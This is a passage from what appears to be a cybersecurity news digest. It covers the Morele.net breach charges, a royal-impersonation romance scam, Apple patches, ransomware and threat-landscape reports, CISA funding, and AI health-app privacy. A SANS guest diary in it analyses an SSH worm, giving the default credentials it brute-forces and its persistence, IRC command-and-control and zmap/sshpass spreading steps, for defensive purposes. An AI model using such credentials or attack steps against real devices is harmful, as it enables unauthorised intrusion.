“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

[13] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach

Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/polish-hacker-charged-seven-years-after-massive-morele-net-data-breach

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelves after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

AI bots are having existential crises, inventing religions, and allegedly plotting against humanity… or so the internet would have you believe.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

All this and more is discussed in episode 454 of the “Smashing Security” podcast with cybersecurity veteran Graham Cluley, and special guest Iain Thomson.

[15] Graham Cluley - Fake Dubai Crown Prince tracked to Nigerian mansion after $2.5M romance scam
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 653 kelime]
An investigation has tracked down a sophisticated scammer who posed as Dubai's Crown Prince in a succesful plot to defraud a Romanian businesswoman out of over US $2.5 million.

That in itself, sadly, is probably not that shocking a story. But what the Organised Crime and Corruption Reporting Project (OCCRP) discovered was that in this particular case the perpetrators presented themselves in the public eye as philanthropists, while secretly destroying victims' lives.

The victim, Laura (not her real name), was a successful Romanian businesswoman when she received a LinkedIn message three years ago from someone claiming to be the Crown Prince of Dubai.

The man said that he wanted her assistance in investing a large amount fo money in a humanitarian foundation in Romania. What followed was a textbook example of how modern romance scams can operate.

Over the next two years, the pair exchanged thousands of messages as a virtual romance developed. Meanwhile, Laura met a man who claimed to be the "Prince's financial manager" in London, where she was given login credentials to a bank account showing a deposit of over £200 million. The banking website was, of course, an elaborate fake.

Fortuitously, a friend of Laura's had helpfully photographed her meeting the "financial manager" - a snap that would later prove crucial.

Laura tried to withdraw funds from the account, only to receive demands for large fees to release "the Prince's funds." As Laura had already sent hundreds of thousands of dollars to her online beau, she kept on paying, believing that it was the only way to recover her money.

In total, she sent over US $2.5 million before realising that she had fallen victim to a con.

But things were not to go all the scammer's way. The fake prince had partners helping move the money, but they fell out over how the spoils of the scam should be divided. Ultimately they made contact with Laura, exposing the fraud and revealing the fake prince's real name: Nzube Henry Ikeji.

Laura was also sent videos of Ikeji at his newly-purchased mansion in Abuja, Nigeria.

Armed with this information, reporters from OCCRP travelled to Nigeria to track the scammer down.

Nigeria does not have extensive Google Street View coverage or complete property registries, and so OCCRP's Chikezie Omeje resorted to old-fashioned methods to locate Ikeji's mansion - spending days driving around Abuja until he found the matching mansion.

Meanwhile, the photograph taken by Laura's friend in London was shared with British police, who recognised the "financial manager" as Dr. Martins Abhulimhen, who they had coincidentally been investigating over suspicious bank transactions. These transactions, it transpired, were Laura's money, which police traced from Dr. Abhulimhen all the way to Nigeria and Ikeji himself.

But rather than hiding in the darkness like some shadowy criminal, Dr. Abhulimhen presented himself as a globe-trotting philanthropist and businessman, rubbing shoulders with powerful Nigerian officials and international figures. Until recently, for instance, he ran a foundation which campaigned against gender-based violence.

Bizarrely, Ikeji also runs a Nigerian humanitarian foundation, and according to British police some of Laura's stolen funds went directly to this charity.

A UK court has since returned to Laura over £113,000from Dr. Martins Abhulimhen's frozen bank accounts, but Laura has been told that any criminal investigation into her case would need to be led by Romanian authorities.

Laura's case may be extreme, but it's far from unique. Romance and investment scams have escalated worldwide, with organised crime syndicates recognising that online fraud can be a lucrative, easy, and comparatively safe way to make millions.

The FBI's Internet Crime Complaint Center consistently ranks romance scams amongst the costliest forms of cybercrime, whilst UK victims lost over £92 million to romance fraud in 2023 alone.

Whether Ikeji or Dr. Abhulimhen will face justice remains unclear. But at least one fake prince has discovered that his Nigerian mansion offers rather less sanctuary than he had hoped.

Four Seconds to Botnet - Analyzing a Self Propagating SSH Worm with Cryptographically Signed C2 [Guest Diary]

[This is a Guest Diary by Johnathan Husch, an ISC intern as part of the SANS.edu BACS program]

Weak SSH passwords remain one of the most consistently exploited attack surfaces on the Internet. Even today, botnet operators continue to deploy credential stuffing malware that is capable of performing a full compromise of Linux systems in seconds.

During this internship, my DShield sensor captured a complete attack sequence involving a self-spreading SSH worm that combines:

- Credential brute forcing
- Multi-stage malware execution
- Persistent backdoor creation
- IRC-based command and control
- Digitally signed command verification
- Automated lateral movement using Zmap and sshpass

Timeline of the Compromise
08:24:13   Attacker connects (83.135.10.12)
08:24:14   Brute-force success (pi / raspberryraspberry993311)
08:24:15   Malware uploaded via SCP (4.7 KB bash script)
08:24:16   Malware executed and persistence established
08:24:17   Attacker disconnects; worm begins C2 check-in and scanning

Figure 1: Network diagram of observed attack

Authentication Activity

The attack originated from 83.135.10.12, which traces back to Versatel Deutschland, an ISP in Germany [1]. 
The threat actor connected using the following SSH client:
SSH-2.0-OpenSSH_8.4p1 Raspbian-5+b1
HASSH: ae8bd7dd09970555aa4c6ed22adbbf56
The 'raspbian' strongly suggests that the attack is coming from an already compromised Raspberry Pi.

Post Compromise Behavior

Once the threat actor was authenticated, they immediately uploaded a small malicious bash script and executed it. 
Below is the attackers post exploitation sequence:

The uploaded and executed script was a 4.7KB bash script captured by the DShield sensor. The script performs a full botnet lifecycle. The first action the script takes is establishing persistence by performing the following:

The threat actor then kills the processes for any competitors malware and alters the hosts file to add a known C2 server [2] as the loopback address

Interestingly, an embedded RSA key was active and was used to verify commands from the C2 operator. The script then joins 6 IRC networks and connects to one IRC channel: #biret

Once connected, the C2 server finishes enrollment by opening a TCP connection, registering the nickname of the device and completes registration. From here, the C2 performs life checks of the device by quite literally playing ping pong with itself. If the C2 server sends down "PING", then the compromised device must send back "PONG".

Lateral Movement and Worm Propagation

Once the C2 server confirms connectivity to the compromised device, we see the tools zmap and sshpass get installed. The device then conducts a zmap scan on 100,000 random IP addresses looking for a device with port 22 (SSH) open. For each vulnerable device, the worm attempts two sets of credentials:

- pi / raspberry
- pi / raspberryraspberry993311

Upon successful authentication, the whole process begins again. 
While a cryptominer was not installed during this attack chain, the C2 server would most likely send down a command to install one based on the script killing processes for competing botnets and miners.

Why Does This Attack Matter

This attack in particular teaches defenders a few lessons:

Weak passwords can result in compromised systems. The attack was successful as a result of enabled default credentials; a lack of key based authentication and brute force protection being configured. 
IoT Devices are ideal botnet targets. These devices are frequently left exposed to the internet with the default credentials still active.
Worms like this can spread both quickly and quietly. This entire attack chain took under 4 seconds and began scanning for other vulnerable devices immediately after.

How To Combat These Attacks

To prevent similar compromises, organizations could:

- Disable password authentication and use SSH keys only
- Remove the default pi user on raspberry pi devices
- Enable and configure fail2ban
- Implement network segmentation on IoT devices

This incident demonstrates how a raspberry pi device with no security configurations can be converted into a fully weaponized botnet zombie. It serves as a reminder that security hardening is essential, even for small Linux devices and hobbyist systems.

Apple Patches Everything: February 2026

Today, Apple released updates for all of its operating systems (iOS, iPadOS, macOS, tvOS, watchOS, and visionOS). The update fixes 71 distinct vulnerabilities, many of which affect multiple operating systems. Older versions of iOS, iPadOS, and macOS are also updated.

OF special note is CVE-2026-20700. This vulnerability has already been exploited in targeted attacks. It allows attackers who can write to memory to execute code. Two vulnerabilities patched in December are related to the same attack (CVE-2025-14174 and CVE-2025-43529).

Interesting are additional Siri/Voice Over vulnerabilities that allow access to some information on locked devices. This is a recurring issue, and you should probably turn off VoiceOver and Siri on locked devices. Another recurring and likely impossible to completely eliminate threat is applications being able to access data from other applications. To reduce the probability of exploitation, limit the Apps you install on your devices.

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

[20] Recorded Future - Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Uncertainty has become the operating environment for business. And this year, fragmentation is driving it.

The global threat landscape didn't simplify in 2025; it shattered. Geopolitical alliances strained. Criminal enterprises splintered under law enforcement pressure, then regrouped into smaller, faster, and harder-to-track operations. State-sponsored cyber actors shifted from dramatic disruptions to quiet pre-positioning, embedding themselves in networks and waiting. Hacktivist groups and influence networks amplified conflicts, blurring the line between genuine intrusions and perception warfare.

But here's what makes this moment dangerous: as long-established norms unwind, fragmentation is paradoxically enabling greater interoperability across domains that were once distinct. State objectives, criminal capability, and private-sector technology increasingly reinforce one another. That convergence creates uncertainty, compresses warning time, and expands plausible deniability.

Today, Recorded Future's Insikt Group releases the 2026 State of Security report, our most comprehensive annual analysis of the forces shaping global security.

Drawing on proprietary intelligence, network telemetry, and deep geopolitical analysis, this report examines how 2025's fractures are reshaping the threat environment — and what security leaders must prepare for in the year ahead.

The End of Stability as a Baseline Assumption

For decades, organizations built risk models around a core premise: that the international order would hold, diplomatic mechanisms would constrain escalation, and major powers would avoid direct confrontation.

That premise no longer applies.

In 2025, the international geopolitical order fragmented as hard-power competition, transactional diplomacy, and the testing of red lines became defining features of state behavior. The Russia–Ukraine war ground into its fourth year, with Moscow maintaining a strategic advantage despite minimal territorial gains. Israel and Iran clashed directly in a twelve-day conflict that reshaped regional power dynamics. India and Pakistan escalated to ballistic missile exchanges before a US-brokered ceasefire intervened. Thailand and Cambodia exchanged fire along disputed borders, triggering the most intense fighting in nearly fifteen years.

The pattern is clear: states are increasingly willing to use force to advance objectives when diplomatic mechanisms appear unreliable. As modern power struggles threaten institutions like international law, risk is spreading across domains that have historically had clearer boundaries.

For organizations, this means geopolitical crises are increasingly likely to spill over into corporate networks, supply chains, regulatory environments, and digital infrastructure with limited warning. Resilience, not stability, became the baseline operating assumption.

State-Sponsored Actors: Risk Moves to the Edges

While kinetic conflicts dominated headlines, some of 2025's most consequential state-sponsored activity unfolded quietly in digital environments — at the edges of networks where oversight is weakest.

China, Russia, Iran, and North Korea, also known as the four most capable and consistently active hostile state cyber actors Insikt Group tracks, focused not on dramatic attacks but on the covert accumulation of access. They targeted identity systems, cloud environments, and edge infrastructure: the poorly monitored network devices, VPN appliances, and perimeter systems that organizations struggle to patch and defend.

Insikt Group's reporting on RedMike highlighted disciplined pre-positioning in telecommunications infrastructure: access built selectively and held quietly for intelligence value by threat actors ready to pivot quickly when timing and pressure align. Chinese state-sponsored actors targeted telecommunications providers worldwide, with one campaign exploiting unpatched Cisco devices across more than 100 countries. Russian GRU-linked groups intensified operations against critical infrastructure in Ukraine and NATO member states. Iranian operators blended espionage with hack-and-leak campaigns. North Korean actors merged revenue generation with espionage, deploying fraudulent IT workers embedded in foreign companies as an access vector.

The strategic shift is profound: the primary risk is no longer a single, large-scale cyber incident. It's sustained pre-positioning that enables persistent espionage in peacetime and creates latent capacity for disruption during crises. Warning timelines are compressing, as the adversaries are already inside.

Hacktivists and Influence Operators: Convergence Across Domains

Every major conflict in 2025 had a digital front, and unsurprisingly, the combatants weren't always who they claimed to be.

Hacktivist groups, patriotic volunteers, and influence networks played growing roles in conflicts involving Israel–Iran, India–Pakistan, Thailand–Cambodia, and Russia–Ukraine. These actors operated with varying degrees of state alignment but consistently contributed to a threat landscape where genuine intrusions, exaggerated claims, and disinformation reinforced one another.

Regional escalation involving Israel and Iran showed how cyber operations, influence campaigns, and commercial surveillance tools can operate alongside military force, as domains converge in ways that would have seemed implausible just years ago. During the India–Pakistan escalation, both sides deployed large-scale influence networks that spread coordinated narratives, forged military documents, and amplified hacktivist claims of grid disruptions. Russian-aligned hacktivists targeted NATO countries with DDoS campaigns, with investigations revealing that portions of this "hacktivist" ecosystem function as state-directed fronts.

The implication for defenders: perception is now contested terrain. Even low-sophistication attacks can generate outsized reputational and psychological impact when amplified through coordinated information operations.

Cybercrime: Fragmented, Modular, Resilient

Law enforcement achieved significant wins against cybercriminal infrastructure in 2025. Forum takedowns, arrests, and sanctions disrupted major operations. Ransomware payments declined for the second consecutive year.

But the criminal ecosystem just adapted to these new conditions.

Sustained pressure fractured large criminal enterprises into smaller, more decentralized operations. Insikt Group identified 289 new ransomware variants this year (a 33% increase from 2024), most of which were derived from leaked source code. Groups adopted subscription models, outsourced operations, and relied on specialized services for laundering and negotiation. The result: a distributed criminal supply chain that's resilient, decentralized, and increasingly difficult to track.

Cybercrime groups increasingly aligned with national strategic objectives, blurring the boundaries between criminal and state activity. In Venezuela, state action eroded legal, political, and cyber boundaries, challenging assumptions about sovereignty and accountability. Mercenary spyware pursued the same persistent-access goals as state actors, embedding where oversight was weakest and adapting under pressure.

English-speaking criminal actors, such as the Scattered LAPSUS$ Hunters collective, demonstrated that low-tech social engineering tactics — particularly help desk impersonation — remain devastatingly effective. Meanwhile, organized crime in Southeast Asia industrialized fraud at an unprecedented scale, with Chinese-speaking transnational criminal organizations running call center compounds using coerced labor augmented by AI-driven automation.

For organizations, the takeaway is stark: threat actors are adapting faster than defenders. Modular criminal ecosystems that share tools, infrastructure, and access can reconstitute rapidly even after disruptions.

Emerging Technologies: Verification Failure at Scale

2025 was not a breakout year for AI-driven cyber operations.

To separate hype from signal, Insikt Group developed AIM3 — our framework for assessing AI malware maturity. It shows that most observed use remains at an early stage of development. Threat actors experimented with malicious AI models tailored for cyber operations, but the results were incremental rather than transformative.

The immediate risk is not autonomous attacks. It's verification failure at scale, where deception becomes faster, cheaper, and more convincing as AI is embedded into decision workflows.

Deepfake-enabled fraud has increased more than tenfold since the start of 2024. Synthetic identity fraud rose 300% in Q1 2025 alone. Adversaries began testing prompt injection attacks and "generated-SEO" manipulation to poison AI search results. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

At the strategic level, the US–China race for AI dominance intensified, with China pursuing an aggressive diffusion strategy that's embedding Chinese LLMs into the global software ecosystem. Competition over quantum computing, advanced robotics, and space systems is extending beyond commercial markets into sustained geopolitical rivalry.

The organizations that act now to establish AI governance, inventory cryptographic dependencies, and prepare for post-quantum migration will hold significant advantages as these technologies mature.

What 2025 Teaches Us About 2026

Looking ahead, diplomatic friction, selective enforcement of norms, and accelerating technology adoption will continue to widen the gap between how risk is assumed to behave and how it actually behaves.

The patterns of 2025 point toward a 2026 threat environment defined by sustained uncertainty:

Simultaneous regional crises will become the norm. As enforcement of established norms becomes more selective, regional and emerging powers will pursue objectives more aggressively, and external intervention in internal conflicts will expand.

Connectivity disruptions will emerge as a primary tool of coercion. Undersea cables, satellite systems, and positioning/navigation/timing infrastructure are becoming strategic targets, with even limited interference capable of cascading across critical sectors.

Ransomware will fragment further. Declining payments will push threat actors toward shorter attack cycles, lower demands, and disruption-focused tactics designed to compel engagement.

The synthetic identity crisis will deepen. AI-enabled deepfakes and compromised identity verification systems will make business email compromise and social engineering more convincing and scalable.

AI will become the next great attack surface. Prompt-based manipulation will increasingly replace code-based exploits as the preferred intrusion method against AI systems.

Quantum readiness will move from planning to spending. Organizations will begin allocating dedicated budgets for cryptographic inventories, vendor transitions, and post-quantum migration pilots.

Robots and space systems will become contested cyber-physical terrain. In 2026, humanoid robots and space infrastructure will move from experimentation to operational deployment, increasing economic and strategic reliance on network-connected cyber-physical systems.

Intelligence does not eliminate uncertainty; having more access to more data points means nothing without context. Rather, intelligence makes the uncertainty more manageable.

Fragmentation creates complexity. But complexity rewards those who can see connections others miss, such as how risks across geopolitics, cyber operations, and criminal ecosystems converge to shape exposure. That's the purpose of the 2026 State of Security report: not just to catalog threats, but to help leaders reduce surprise, prioritize effectively, and act with confidence.

The full report includes detailed analysis of each threat domain, threat actor profiles, regional risk assessments, and actionable recommendations for building organizational resilience.

[21] Recorded Future - From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations
────────────────────────────────────────────────────────────────────────────────

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[22] Cyberscoop - 0APT ransomware group rises swiftly with bluster, along with genuine threat of attack
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 22:29:26 +0000

[TAM METİN - 945 kelime]
Ransomware groups crop up like weeds, angling for striking positions in a crowded field rife with turnover, infighting and unbridled competition. Yet, they rarely emerge, as 0APT did late last month, claiming roughly 200 victims out of the gate.

Researchers have thus far seen no evidence confirming 0APT attacked any of its alleged victims, which includes high-profile organizations. Alleged victim data samples and the structure and size of placeholder file trees published by 0APT place further doubt on the group’s supposed criminal escapades.

Most signs suggest the group is running a massive hoax, but at least some of the threat 0APT poses is grounded in truth. The group’s inflated pretense may be a ruse to create a sense of momentum, gain recognition and attract affiliates.

“While 0APT is probably bluffing about the victims it has already compromised, it is not bluffing on the technical capabilities of its actual ransomware,” Cynthia Kaiser, senior vice president at Halcyon’s ransomware research center, told CyberScoop.

0APT’s infrastructure is sound, including cryptographically strong and fully operational ransomware binaries, unique code and a well organized panel for affiliates, she said. “Even if researchers assess most claimed victims as fabricated, the underlying ransomware payload represents genuine risk to any organization that encounters it.”

The group’s outlandish claims accentuates the messy state of ransomware, with researcher interest and widespread fear among potential victims — perceived or real — delivering benefits for criminal syndicates that compete for mindshare and co-conspirators.

0APT’s apparent swift rise with a massive alleged victim count that hovered around 200 organizations within its first week online caught the attention of multiple ransomware research firms, resulting in reports this week by Halcyon and GuidePoint Security.

Researchers roundly consider the group’s initial claims an act of deception. This pattern of claiming a high number of victims without substantiating evidence surfaced last year with other ransomware groups, including Babuk2 and FunkSec, which eventually disclosed confirmed victims.

“After those initial fake lists, we started to see legitimate victims as the gangs attracted affiliates and matured into fully functioning ransomware-as-a-service organizations,” Kaiser said.

GuidePoint researchers acknowledge 0APT could evolve into a genuine problem, but they are more dismissive of the group’s capabilities.

Justin Timothy, principal threat intelligence consultant at GuidePoint, said 0APT’s encryptor isn’t unique or noteworthy amongst its ransomware peers.

“The ransomware encryptor is only one piece of the attack kill chain,” he said. “Threat actors still need to be able to obtain initial access, escalate privilege, and move laterally all while evading detection and endpoint detection and response. These aspects can often take more skill and technical knowledge compared to the creation of encryption malware.”

While 0APT might be running a scam, it doesn’t appear to be a fly-by-night operation.

The group’s alleged victims are opportunistic and predominantly operate in critical infrastructure and data-rich sectors, according to Halcyon. Most of the claimed victims are based in the United States, and the top sectors targeted include health care, professional services, technology, transportation and logistics, energy and manufacturing.

0APT has been consistently adding and removing alleged victims from its data-leak site, which went offline briefly before returning earlier this week with a much lower victim count.

“The group’s early claims appear to focus more on gaining visibility and momentum, believing those will recruit affiliates faster than validity,” Kaiser said.

Attracting affiliates and attention for future operations could be driving some of 0APT’s behavior, but cybercriminals frequently deride such activities once the extent of their lies becomes widely known, said Jason Baker, managing security consultant of threat intelligence at GuidePoint.

“That strategy was almost certainly shortsighted and undermined by 0APTs fabrications, which render them an unattractive partner or destination for affiliates going forward,” Baker said. “After all, if they’re willing to lie this brazenly about their victims and capabilities, why wouldn’t they lie to their affiliates as well?”

The make-up of 0APT remains unknown, with no obvious lineage or overlap with other ransomware variants, but the group is financially motivated and very aggressive in communications, Kaiser said.

“While the operators appear to not be novices, we have no evidence of who is running the group or its exact origins,” she added.

Halcyon, which is developing technical analysis on the group, insists 0APT poses a genuine threat that will eventually ensnare legitimate victims.

“Given the fact that they are attracting attention and operating a capable encryptor, we see the potential as high that real victims may soon appear,” Kaiser said. A focused rebrand, such as removing all the fake victims and starting to list real victims, even only a few, will be a strong signal that the group has evolved into a serious operation.”

[23] Cyberscoop - Acting CISA chief says DHS funding lapse would limit, halt some agency work
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 22:04:31 +0000
Link: https://cyberscoop.com/cisa-shutdown-impact-dhs-funding-testimony/

[TAM METİN - 669 kelime]
Another Department of Homeland Security shutdown would hamper the Cybersecurity and Infrastructure Security Agency’s ability to respond to threats, offer services, develop new capabilities and finish writing a key regulation, its acting director told Congress Wednesday.

Some of those activities would continue on a limited basis, while others would halt entirely, acting CISA leader Madhu Gottumukkala testified before the House Appropriations Subcommittee on Homeland Security.

“A lapse in funding would impede CISA’s ability to perform … good work,” he told the panel. “When the government shuts down, our adversaries do not.”

As lawmakers held the hearing, DHS was hurtling toward another potential shutdown as Democrats and Republicans clashed over Trump administration immigration policies and enforcement, with a focus most recently on the massive influx of DHS officers in Minneapolis, where those officers have killed multiple U.S. citizens.

Republicans said at the hearing the testimony should persuade Democrats to fund DHS, since its border operations are largely funded by last year’s budget reconciliation law and a shutdown would mainly harm DHS’s other agencies. Democrats said the hearing was “for show,” as they have put forward proposals to fund the rest of DHS as the immigration debate continues — and as 90% of DHS would continue operating under a shutdown, as the panel’s top Democrat, Henry Cuellar of Texas, asserted.

Gottumukkala said CISA planned to designate 888 of its 2,341 employees as “excepted,” meaning they could continue to work during a shutdown, albeit without pay.

“We will do everything we can to meet our mission during the shutdown,” he said. “Uncertainty and those missed paychecks are a serious hardship.”

CISA has reduced its personnel by a third under the second presidency of Donald Trump.

A shutdown “would delay deploying cybersecurity services and capabilities to federal agencies, leaving significant gaps in security programs,” Gottumukkala said in his written testimony. “CISA’s capacity to provide timely and actionable guidance to help partners defend their networks would be degraded.”

There’s a divide between activities CISA could continue in some capacity versus those they would have to shutter entirely during a funding lapse, he said.

“Limited activities include responding to imminent threats, sharing timely vulnerability and incident information, maintaining our 24/7 operations center, and operating cybersecurity shared services,” Gottumukkala said. “However, CISA would not perform any strategic planning, development of cybersecurity advice and guidance, or development of new technical capabilities.”

There would likely be delays in activities like issuing binding operational directives to federal agencies or completing the already-delayed regulations stemming from the Cyber Incident Reporting for Critical Infrastructure Act (CIRCIA), the latter of which would require critical infrastructure operators to report major cyber incidents to CISA and would be paused during a shutdown, he said.

Gottumukkala’s testimony is the latest before Congress to focus on personnel at CISA. The chairman of the Appropriations subcommittee, Rep. Mark Amodei, R-Nev., chided Gottumukkala for what he said were delays in CISA providing a reorganization plan to the panel.

“We’ve been professional. We’ve been respectful,” Amodei said. “We expect exactly the same thing in return.”

[24] Cyberscoop - Your AI doctor doesn’t have to follow the same privacy rules as your real one
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 19:51:01 +0000
Link: https://cyberscoop.com/ai-healthcare-apps-hipaa-privacy-risks-openai-anthropic/

[TAM METİN - 1570 kelime]
AI apps are making their way into healthcare. It’s not clear that rigorous data security or privacy practices will be part of the package.

OpenAI, Anthropic and Google have all rolled out AI-powered health offerings from over the past year. These products are designed to provide health and wellness advice to individual users or organizations, helping to diagnose their illnesses, examine medical records and perform a host of other health-related functions.

OpenAI says that hundreds of millions of people already use ChatGPT to answer health and wellness questions, and studies have found that large language models can be remarkably proficient at medical diagnostics, with one paper calling their capabilities “superhuman” when compared to a human doctor.

But in addition to traditional cybersecurity concerns around how well these chatbots can protect personal health data, there are a host of questions around what kind of legal protections users would have around the personal medical data they share with these apps. Several health care and legal experts told CyberScoop that these companies are almost certainly not subject to the same legal or regulatory requirements – such as data protection rules under the Health Insurance Portability and Accountability Act (HIPAA) – that compel hospitals and other healthcare facilities to ensure protection of your data.

Sara Geoghegan, senior counsel at the Electronic Privacy Information Center, said offering the same or similar data protections as part of a terms of service agreement is markedly different from interacting with a regulated healthcare entity.

“On a federal level there are no limitations – generally, comprehensively – on non-HIPAA protected information or consumer information being sold to third parties, to data brokers,” she said.

She also pointed to data privacy concerns that stemmed from the bankruptcy and sale of genetic testing company 23andMe last year as a prime example of the dangers consumers face when handing over their sensitive health or biometric data to a unregulated entity.

In many cases, these AI health apps carry the same kind of security and privacy risks as other generative AI products: data leakage, hallucinations, prompt injections and a propensity to give confident but wrong answers.

Additionally, data breaches in the healthcare industry have become increasingly common over the past several years, even before the current AI boom. Healthcare organizations are frequent targets for hacking, phishing, and ransomware, and even though companies can be held legally responsible under HIPAA for failing to protect patient data, breaches still happen because many systems rely on outdated software, depend on numerous outside vendors, and struggle to keep up with the cost and complexity of strong cybersecurity.

Carter Groome, CEO of First Health Advisory, a healthcare and cybersecurity risk management consulting firm, said that beyond concerns over whether these tech companies can even reasonably promise to protect your health data, it’s also not clear their security protections are anything more than a company policy.

“They’re not mandated by HIPAA,” Groome said. “Organizations that are building apps, there’s a real gray area for any sort of compliance” with health care data privacy laws.

Privacy is especially important in health and medicine, both for protecting sensitive medical information and for building trust in the health system overall. That’s why hospitals, doctor’s offices, lab testing facilities and other associated entities have been subject to heightened laws and regulations around protecting patient records and other health data.

